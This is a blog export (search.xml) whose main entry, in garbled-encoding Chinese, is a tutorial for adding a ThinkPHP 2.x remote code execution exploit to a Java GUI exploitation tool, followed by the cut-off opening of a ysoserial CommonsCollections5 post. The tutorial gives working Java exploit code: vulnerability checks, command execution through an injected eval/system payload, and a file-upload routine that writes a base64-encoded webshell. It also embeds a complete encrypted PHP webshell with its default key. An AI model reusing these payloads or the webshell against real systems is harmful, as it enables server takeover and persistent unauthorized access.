<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ExpDemo-JavaFXå·¥å…·æ–°å¢æ¼æ´ç¼–å†™æ•™ç¨‹</title>
    <url>/2021/08/19/ExpDemo-JavaFX%E5%B7%A5%E5%85%B7%E6%96%B0%E5%A2%9E%E6%BC%8F%E6%B4%9E%E7%BC%96%E5%86%99%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<blockquote>
<p>  ä¸ºäº†æé«˜å¤§ä½¬ä»¬æäº¤PRçš„ç§¯ææ€§ï¼Œæˆ‘ä¹Ÿæ˜¯æ‹¼äº†ï¼ˆ<del>è¿™æ ·æˆ‘å°±å¯ä»¥åæ­£è¨€é¡ºçš„å·æ‡’äº†</del>ï¼‰</p>
</blockquote>
<h2 id="0x01-é€‰æ¼æ´ï¼Œæ–°å»ºæ–‡ä»¶"><a href="#0x01-é€‰æ¼æ´ï¼Œæ–°å»ºæ–‡ä»¶" class="headerlink" title="0x01 é€‰æ¼æ´ï¼Œæ–°å»ºæ–‡ä»¶"></a>0x01 é€‰æ¼æ´ï¼Œæ–°å»ºæ–‡ä»¶</h2><p>æ¯”å¦‚ ThinkPHP2.xçš„ä»»æ„ä»£ç æ‰§è¡Œï¼Œä½¿ç”¨vulhubæ­å»ºæ¼æ´</p>
<p><a href="https://vulhub.org/#/environments/thinkphp/2-rce/">https://vulhub.org/#/environments/thinkphp/2-rce/</a></p>
<p>docker-compose up -d ä¸€é”®æ­å»º</p>
<p>ç°åœ¨è¿˜æ²¡æœ‰ThinkPHP ç›¸å…³çš„åˆ©ç”¨æ¶å­ï¼Œç•Œé¢æ˜¾ç¤ºä¹Ÿæ²¡æœ‰ï¼Œåªæ˜¯æœ‰ä¸ªæŒ‰é’®(æˆ‘ç‰¹æ„æŒ‘çš„ï¼Œä»å›¾åˆ°expç¼–å†™ä¸€å—æ•™)</p>
<h3 id="1-1-å…ˆæŠŠç•Œé¢ç«‹èµ·æ¥"><a href="#1-1-å…ˆæŠŠç•Œé¢ç«‹èµ·æ¥" class="headerlink" title="1.1 å…ˆæŠŠç•Œé¢ç«‹èµ·æ¥"></a>1.1 å…ˆæŠŠç•Œé¢ç«‹èµ·æ¥</h3><p>åœ¨<strong>src&#x2F;main&#x2F;resources</strong>ä¸‹å¯ä»¥çœ‹åˆ°å­˜åœ¨è¿™ä¹ˆå¤š<strong>fxml</strong>æ–‡ä»¶ï¼Œç›´æ¥å¤åˆ¶ä¸€ä¸ª<strong>Struts2.fxml</strong>,å‘½åä¸º<strong>ThinkPHP.fxml</strong> ç®€ç­”æ–¹ä¾¿ï¼ˆè‹¥æœ‰å¤§ä½¬å¯¹ç•Œé¢ä¸æ»¡æ„ï¼Œè¯·è‡ªä¸ªè°ƒï¼Œæˆ‘ä¸ç®¡äº†ï¼‰<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011617.png" alt="image-20210818201601174"></p>
<p>ç„¶åå°†<strong>Struts2Controller</strong>æ”¹ä¸º<strong>ThinkPHPController</strong>, å†å°†85è¡Œçš„test.jsp æ”¹ä¸º test.php<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011626.png" alt="image-20210818201939529"></p>
<p>ä¼šå‘ç°çˆ†çº¢ï¼Œè¿™æ˜¯å› ä¸ºè¿˜æ²¡æœ‰<strong>ThinkPHP</strong>çš„é€»è¾‘æ§åˆ¶ã€‚åˆ°è¿™é‡Œå†å¤åˆ¶ä¸€ä»½<strong>Struts2Controller.java</strong>æ”¹ä¸º<strong>ThinkPHPController.java</strong>å³å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011632.png" alt="image-20210818202113039"></p>
<p>è¿˜æœ‰ä¸€ä¸ªï¼Œä½ è¦åœ¨ç•Œé¢æœ‰ä¸ªæŒ‰é’®å»æ§åˆ¶æ˜¾ç¤ºï¼Œåœ¨<strong>src&#x2F;main&#x2F;resources&#x2F;fxml&#x2F;Main.fxml</strong>çš„43è¡Œï¼Œç°åœ¨å·²ç»æœ‰ä¸ª<strong>ThinkPHP</strong>çš„æŒ‰é’®äº†ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå¤åˆ¶ä¸€è¡Œ&lt;JFXButton â€¦&gt; ï¼Œç„¶åå°†<strong>accessibleText</strong>æ”¹ä¸ºä½ æ–°å»ºçš„**.fxml<strong>ä¸€æ¨¡ä¸€æ ·çš„åå­—ï¼Œå†å°†</strong>text**æ”¹æˆä½ æƒ³æ˜¾ç¤ºçš„åç§°<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011643.png" alt="image-20210818202513653"></p>
<p>å¥½äº†ï¼Œç°åœ¨ç•Œé¢å¥½äº†ï¼Œè¿è¡Œ<strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;AppStartUp.java</strong>çœ‹ä¸‹å§</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011649.png" alt="image-20210818202826787"></p>
<p>æ–°å»ºä¸€ä¸ªç•Œé¢ç®€å•å§</p>
<h3 id="1-2-æ–°å»ºexpæ–‡ä»¶"><a href="#1-2-æ–°å»ºexpæ–‡ä»¶" class="headerlink" title="1.2 æ–°å»ºexpæ–‡ä»¶"></a>1.2 æ–°å»ºexpæ–‡ä»¶</h3><p>ç°åœ¨expåŒ…ä¸‹ï¼Œè¿˜æ²¡æœ‰æ–°å»ºphpç›¸å…³çš„æ¼æ´ï¼ˆå»ºåŒ…ä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿ç®¡ç†ï¼ŒåŒç±»å‹çš„ï¼Œæ”¾ä¸€ä¸ªåŒ…ä¸‹ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011658.png" alt="image-20210818200412029"></p>
<p>å³é”®æ–°å»ºjavaæ–‡ä»¶ï¼Œ<strong>php.thinkphp.ThinkPHP2x</strong> ,è¿™è¡¨ç¤ºåœ¨<strong>php</strong>åŒ…ä¸‹çš„<strong>thinkphp</strong>åŒ…ä¸‹æ–°å»º<strong>ThinkPHP2x.java</strong>æ–‡ä»¶ï¼Œæ²¡æœ‰åŒ…åˆ™åˆ›å»ºåŒ…ï¼ˆä½ å°±è¯´ç»†ä¸ç»†å§ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011704.png" alt="image-20210818200550535"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011711.png" alt="image-20210818200831938"></p>
<p>ä¸€ä¸ªEXPæ–‡ä»¶é¦–å…ˆè¦å®ç°<strong>ExploitInterface</strong>æ¥å£ï¼Œçœ‹è§çˆ†çº¢ä¸è¦æ…Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011717.png" alt="image-20210818200904924"></p>
<p>é¼ æ ‡æ‚¬æµ®ä¸Šå»ï¼Œç‚¹å‡»å®ç°å…¨éƒ¨æ–¹æ³•ï¼ˆæˆ‘å°±å½“å¤§ä½¬ä»¬éƒ½ä¸ä¼šjavaã€‚æ€ä¹ˆå¯èƒ½å‘¢ï¼Ÿï¼ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011728.png" alt="image-20210818200947514"></p>
<p>æ¡†æ¶å¥½äº†ï¼Œç°åœ¨å¡«EXPï¼Œå…·ä½“æ–¹æ³•ä½œç”¨ä¸€çœ‹å°±æ‡‚äº†,åœ¨ç±»ä¸­å†å£°æ˜ä¸¤ä¸ªå±æ€§ï¼Œä¸€ä¸ªtargeã€ä¸€ä¸ªisVul</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011734.png" alt="image-20210818212249668"></p>
<h3 id="1-3-ä»£ç å’Œç•Œé¢è”åŠ¨"><a href="#1-3-ä»£ç å’Œç•Œé¢è”åŠ¨" class="headerlink" title="1.3 ä»£ç å’Œç•Œé¢è”åŠ¨"></a>1.3 ä»£ç å’Œç•Œé¢è”åŠ¨</h3><p>æ¥ä¸‹æ¥å…³æ³¨åˆšæ–°å»ºçš„<strong>ThinkPHPController.java</strong>æ–‡ä»¶ï¼Œä¿®æ”¹49è¡Œçš„ <strong>BASICINFO</strong> å’Œ <strong>STRUTS2</strong> å±æ€§ä¸º<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011742.png" alt="image-20210818214305224"></p>
<p>ä½¿ç”¨Ctrl + r å¥,å°† STRUTS2 å…¨éƒ¨æ›¿æ¢ä¸º ThinkPHP </p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011749.png" alt="image-20210818214503421">   å†æ·»åŠ ä¸€ä¸ªå±æ€§ï¼Œé»˜è®¤ä¸Šä¼ çš„shell</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SHELL</span> <span class="operator">=</span> <span class="string">&quot;&lt;?php\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;@error_reporting(0);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;session_start();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $key=\&quot;e45e329feb5d925b\&quot;; //è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$_SESSION[&#x27;k&#x27;]=$key;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tsession_write_close();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$post=file_get_contents(\&quot;php://input\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tif(!extension_loaded(&#x27;openssl&#x27;))\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$t=\&quot;base64_\&quot;.\&quot;decode\&quot;;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=$t($post.\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\tfor($i=0;$i&lt;strlen($post);$i++) &#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\telse\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=openssl_decrypt($post, \&quot;AES128\&quot;, $key);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $arr=explode(&#x27;|&#x27;,$post);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $func=$arr[0];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $params=$arr[1];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tclass C&#123;public function __invoke($p) &#123;eval($p.\&quot;\&quot;);&#125;&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    @call_user_func(new C(),$params);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;?&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>238è¡Œä¹Ÿä¿®æ”¹ test.jsp æ”¹ä¸º test.php</p>
<p>ä¿®æ”¹<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011758.png" alt="image-20210819011243601"></p>
<p>è¿™ä¸ªæ–‡ä»¶ä¿®æ”¹å®Œæ¯•ï¼Œä¸ç”¨åŠ¨äº†ï¼Œä»¥åå†æ·»åŠ thinkphpç›¸å…³æ¼æ´ï¼Œåªéœ€è¦æ”¹<strong>BASICINFO</strong>ä¸­çš„æè¿°ä¿¡æ¯(ä¸åŠ ä¹Ÿå¯,ç¿»éçœ‹)ï¼Œ<strong>ThinkPHP</strong> è¿˜æ˜¯è¦æ”¹çš„ï¼Œè¿™ä¸ªæ˜¯é€‰æ‹©æ¼æ´åˆ—è¡¨ä¸­çš„ä¸œè¥¿ï¼Œå¾€åæ·»åŠ å°±è¡Œã€‚</p>
<p>ä¸‹é¢å» <strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;tools&#x2F;Tools.java</strong>æ–‡ä»¶ï¼Œ æ‰¾åˆ°184è¡Œçš„<strong>getExploit</strong>æ–¹æ³•ã€‚</p>
<p>æ·»åŠ ä¸€ä¸ªåˆ¤æ–­å°±è¡Œï¼Œ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011804.png" alt="image-20210818215324824"></p>
<p>è¿™å°±å®Œäº†ï¼Œçœ‹ç€å›¾å¤šï¼Œå…¶å®å°±å‡ æ­¥ï¼Œä¸»è¦æ˜¯ä¸ºäº†è¯¦ç»†</p>
<h2 id="0x02-å†™EXPçš„å…·ä½“å®ç°"><a href="#0x02-å†™EXPçš„å…·ä½“å®ç°" class="headerlink" title="0x02 å†™EXPçš„å…·ä½“å®ç°"></a>0x02 å†™EXPçš„å…·ä½“å®ç°</h2><h3 id="2-1-checkVul-é¦–å…ˆæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"><a href="#2-1-checkVul-é¦–å…ˆæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨" class="headerlink" title="2.1 checkVul - é¦–å…ˆæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"></a>2.1 checkVul - é¦–å…ˆæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨</h3><p>Vulhub ä¹Ÿç»™äº†payloadï¼Œæ–¹ä¾¿çœäº‹ï¼Œä½¿ç”¨pocæ‰“ä¸€ä¸‹,åŸpocæ˜¯è¾“å‡ºphpinfo,è¿™é‡Œæ”¹æˆäº†è¾“å‡ºä¸€ä¸²å­—ç¬¦<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011812.png" alt="image-20210818213036338"></p>
<p>è½¬æˆjava,éƒ½æ˜¯æœ€åŸºç¡€çš„å†™æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkVul</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = url;</span><br><span class="line">        <span class="comment">// è¿™é‡Œå¯ä»¥é€šè¿‡åˆ¤æ–­å¯¹æ–¹æ˜¯å¦æ‰§è¡Œäº† md5 è®¡ç®—ï¼Œè¾“å‡º 202cb962ac59075b964b07152d234b70 æ¥éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">check_payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(md5(123))&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// post è¯·æ±‚ï¼Œæ ¹æ®ä¸åŒçš„expï¼Œå¯èƒ½éœ€è¦ä¸åŒçš„è¯·æ±‚æ–¹å¼ï¼Œçœ‹éœ€æ›´æ”¹ï¼Œè¯·æ±‚æ–¹å¼åŸºæœ¬éƒ½å®ç°äº†ï¼Œè‹¥æœ‰é—æ¼ï¼Œè¯·æäº¤issues</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨ src/main/java/fun/fireline/tools/HttpTool.java å·¥å…·åŒ…ä¸­çš„ get æ–¹æ³•æäº¤</span></span><br><span class="line">            <span class="comment">// æ³¨æ„ è¿™è¦ç”¨ try  catch æ•è·ä¸€ä¸‹å¼‚å¸¸</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + check_payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            <span class="comment">// çœ‹å›æ˜¾ï¼Œæ˜¯å¦å­˜åœ¨ 202cb962ac59075b964b07152d234b70</span></span><br><span class="line">            System.out.println(result);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> result.contains(<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                <span class="built_in">this</span>.isVul = <span class="literal">true</span>;  <span class="comment">// å­˜åœ¨æ¼æ´</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// è¾“å‡ºé”™è¯¯æ—¥å¿—</span></span><br><span class="line">            logger.error(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å†™å®Œæµ‹è¯•ä¸€ä¸‹</p>
<p>è¿è¡Œ<strong>AppStartUp.java</strong>ï¼Œæµ‹è¯•ä¸€ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011828.png" alt="image-20210818224529463"></p>
<p>æˆåŠŸï¼Œè€Œä¸”å¯ä»¥è®¾ç½®ä»£ç†ï¼Œèµ°bpï¼Œçœ‹å…·ä½“æµé‡</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011837.png" alt="image-20210818224612182"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011844.png" alt="image-20210818224629863"></p>
<h3 id="2-2-getWebPath-è·å–ç½‘ç«™æ ¹ç›®å½•"><a href="#2-2-getWebPath-è·å–ç½‘ç«™æ ¹ç›®å½•" class="headerlink" title="2.2 getWebPath è·å–ç½‘ç«™æ ¹ç›®å½•"></a>2.2 getWebPath è·å–ç½‘ç«™æ ¹ç›®å½•</h3><p>è¿™ä¸ªå†™ä¸å†™éƒ½è¡Œï¼Œè¿™é‡Œå†™ä¸€ä¸‹å§,thinkphp å¯ä»¥é€šè¿‡<code>realpath(__ROOT__)</code>æ¥è·å–ç½‘ç«™çš„æ ¹è·¯å¾„ï¼Œæ”¹ä¸‹payloadå°±å¥½</p>
<p><code>/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å–å½“å‰çš„webè·¯å¾„ï¼Œæœ‰æœ€å¥½ï¼Œæ²¡æœ‰ä¹Ÿæ— æ‰€è°“</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getWebPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// è¿™ä¸ªpayloadä¼šæŠŠ htmlç½‘é¡µä¹Ÿç»™è¾“å‡ºï¼Œè¿™é‡Œåˆ†å‰²ç®€å•å»é™¤ä¸€ä¸‹</span></span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;å‘½ä»¤æ‰§è¡Œå¤±è´¥&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011857.png" alt="image-20210818230017745"></p>
<h3 id="2-3-exeCmd-æ‰§è¡Œå‘½ä»¤"><a href="#2-3-exeCmd-æ‰§è¡Œå‘½ä»¤" class="headerlink" title="2.3 exeCmd  æ‰§è¡Œå‘½ä»¤"></a>2.3 exeCmd  æ‰§è¡Œå‘½ä»¤</h3><p>è¿™é‡Œå…ˆå°† <strong>isVul</strong>æ–¹æ³•æ”¹ä¸€ä¸‹ï¼Œå‘½ä»¤æ‰§è¡Œä¾èµ–äºæ£€æµ‹ï¼Œåªæœ‰æ£€æµ‹å­˜åœ¨ï¼Œæ‰èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isVul</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isVul;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payload <code>/index.php?s=/index/index/name/$&#123;@print(system(whoami))&#125;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">exeCmd</span><span class="params">(String cmd, String encoding)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(system(payload))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// æ›¿æ¢payload ä¸­çš„ payload å­—ç¬¦ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">        payload = payload.replace(<span class="string">&quot;payload&quot;</span>, cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•é€šè¿‡</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011905.png" alt="image-20210818230642660"></p>
<h3 id="2-4-uploadFile-ä¸Šä¼ shell"><a href="#2-4-uploadFile-ä¸Šä¼ shell" class="headerlink" title="2.4 uploadFile ä¸Šä¼ shell"></a>2.4 uploadFile ä¸Šä¼ shell</h3><p>Payload <code>http://127.0.0.1:8080/index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;</code> è¿™æ˜¯ç½‘ä¸Šçš„payloadï¼Œä¸Šä¼ åä½¿ç”¨èšå‰‘è¿æ¥å³å¯</p>
<p>è™½ç„¶ï¼Œç›´æ¥ä½¿ç”¨è¿™ä¸ªpayloadä¹Ÿå¯ç”¨ï¼Œä½†ä¸æ–¹ä¾¿æˆ‘ä»¬è‡ªå®šä¹‰ä¸Šä¼ çš„shellé©¬</p>
<p>@bewhale å¸ˆå‚…çš„ thinkphpåˆ©ç”¨å·¥å…· <a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a> ä¸­ä½¿ç”¨è¿™ä¸ªpayloadæ¥ä¸Šä¼ æ–‡ä»¶</p>
<p><code>/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#39;bak.php&#39;,base64_decode(&#39;PD9waHAgJGE9In4rZCgpIl4iIXsre30iO0AkYj1iYXNlNjRfZGVjb2RlKCR7JGF9WyJhIl0pO2V2YWwoIiIuJGIpOz8%2B&#39;)); </code></p>
<p>æ‹¿æ¥ç›´æ¥ç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(String fileContent, String filename, String platform)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// å¯¹æ–‡ä»¶ base64 ç¼–ç </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Data</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileContent.getBytes());</span><br><span class="line">        <span class="comment">// æ³¨æ„ä¸€ä¸‹ï¼Œéœ€è¦å¯¹ base64 ç¼–ç åçš„åœ¨è¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼Œ</span></span><br><span class="line">        base64Data = URLEncoder.encode(base64Data, <span class="string">&quot;UTF-8&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#x27;&quot;</span> + filename + <span class="string">&quot;&#x27;,base64_decode(&#x27;&quot;</span> + base64Data + <span class="string">&quot;&#x27;));&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸Šä¼ åï¼Œè®¿é—®ä¸€æ¬¡ä¸Šä¼ çš„æ–‡ä»¶ï¼Œçœ‹è¿”å›å€¼æ˜¯å¦ä¸º200æ¥åˆ¤æ–­æ˜¯å¦ä¸Šä¼ æˆåŠŸ</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> HttpTool.getStatus(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line">        System.out.println(status);</span><br><span class="line">        <span class="keyword">if</span>(status == <span class="number">200</span>) &#123;</span><br><span class="line">            result = <span class="string">&quot;ä¸Šä¼ æˆåŠŸ! è·¯å¾„ï¼š &quot;</span> + <span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result =  <span class="string">&quot;ä¸Šä¼ å¤±è´¥ï¼Œ è¯·ç”¨è¿™ä¸ªpayloadï¼Œèšå‰‘è¿æ¥è¯•ä¸€ä¸‹ /index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011913.png" alt="image-20210819011430581"></p>
<p>æ‰“å®Œæ”¶å·¥</p>
]]></content>
      <categories>
        <category>GitHubå·¥å…·</category>
      </categories>
      <tags>
        <tag>GitHubå·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ysoserialå­¦ä¹ ä¹‹CommonsCollections5(å››)</title>
    <url>/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/</url>
    <content><![CDATA[<blockquote>
<p>  åº†ç¥æˆ‘ä¼Ÿå¤§çš„å…šç™¾å¹´åè¯ğŸ‰</p>
<p>  å‘ä¼Ÿå¤§çš„ç¥–å›½æ•¬ç¤¼(â€˜-â€˜*ã‚</p>
</blockquote>
<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¸ŠèŠ‚è¯´é“åœ¨<strong>commons-collections-3.2.1.jar!&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;keyvalue&#x2F;TiedMapEntry.class</strong>ç±»ä¸­ï¼Œæ€»å…±æœ‰ä¸‰ä¸ªå‡½æ•°è°ƒç”¨äº†<strong>getValue</strong>å‡½æ•°ï¼š</p>
<ul>
<li><p><strong>toString</strong>    CC5   æœ¬æ–‡é‡ç‚¹</p>
</li>
<li><p><strong>hashCode</strong>    CC6</p>
</li>
<li><p><strong>equals</strong>      CC7</p>
</li>
</ul>
